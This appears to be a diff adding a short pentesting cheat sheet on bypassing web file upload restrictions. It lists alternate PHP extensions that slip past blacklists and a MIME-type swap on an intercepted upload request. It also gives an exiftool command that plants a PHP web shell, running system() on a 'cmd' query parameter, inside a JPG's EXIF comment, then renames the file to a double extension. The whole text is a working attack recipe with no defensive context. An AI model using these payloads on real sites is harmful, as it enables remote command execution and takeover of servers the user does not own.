@@ -1,0 +1,17 @@
+HOW TO BYPASS FILE UPLOAD RESTRICTIONS? 
+
+1. Use alternate file extensions
+php - .phtml, .php3, .php4, .php5, and .inc 
+
+A website can blacklist .php extension but they didn't blacklist .php3
+
+2. Change MIME type
+a. Intercept file upload request
+b. Replace: Content-type: application/x-php with Content-type: image/jpeg
+
+3. EXIF comments
+Inject PHP code inside exif data comments in JPG files: 
+a. exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
+b. mv file.jpg file.php.jpg 
+
+Install exiftool: https://exiftool.org/install.html
